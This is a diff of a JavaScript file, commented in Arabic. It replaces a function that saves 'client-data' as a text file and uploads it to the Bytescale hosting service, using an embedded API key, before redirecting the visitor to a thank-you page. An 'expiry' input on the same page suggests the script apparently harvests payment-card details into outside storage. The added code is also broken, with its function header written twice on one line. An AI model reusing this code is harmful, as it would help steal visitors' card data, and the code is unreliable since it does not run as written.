@@ -253,30 +253,28 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // دالة لرفع الملف إلى Filestack
-  function uploadFileToBytescale(fileContent) {
-    const apiKey = 'public_FW25cKPDX7Mjf9E9kNGWJ5BbUKLk'; // استبدل بـ API Key الخاص بـ Bytescale
-    const endpoint = 'https://api.bytescale.com/upload'; // رابط واجهة API الخاصة بـ Bytescale
+  function uploadFileToBytescale(fileContent) {function uploadFileToBytescale(fileContent) {
+      const options = {
+        apiKey: 'public_FW25cKPDX7Mjf9E9kNGWJ5BbUKLk', // استبدل بـ API Key الخاص بك
+        maxFileCount: 1,
+        accept: ['text/plain'], // قبول الملفات النصية فقط
+      };
 
-    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+      const fileBlob = new Blob([fileContent], { type: 'text/plain' });
 
-    const formData = new FormData();
-    formData.append('file', fileBlob, 'client-data.txt'); // اسم الملف مع الامتداد
-    formData.append('key', apiKey); // تضمين مفتاح API
-
-    fetch(endpoint, {
-        method: 'POST',
-        body: formData,
-    })
-        .then((response) => response.json())
-        .then((res) => {
-            console.log('File uploaded successfully:', res);
-            // إعادة توجيه المستخدم إلى صفحة "شكرًا"
-            window.location.href = 'thank-you.html'; // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
-        })
-        .catch((err) => {
-            console.error('Error uploading file:', err);
-        });
-}
+      Bytescale.UploadWidget.open(options).then(
+        () => {
+          Bytescale.upload(fileBlob).then((response) => {
+            console.log('File uploaded successfully:', response);
+            // إعادة التوجيه بعد رفع الملف
+            window.location.href = 'thank-you.html'; // قم بتغيير الرابط حسب الحاجة
+          });
+        },
+        (error) => {
+          console.error('Error uploading file:', error);
+        }
+      );
+    }
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
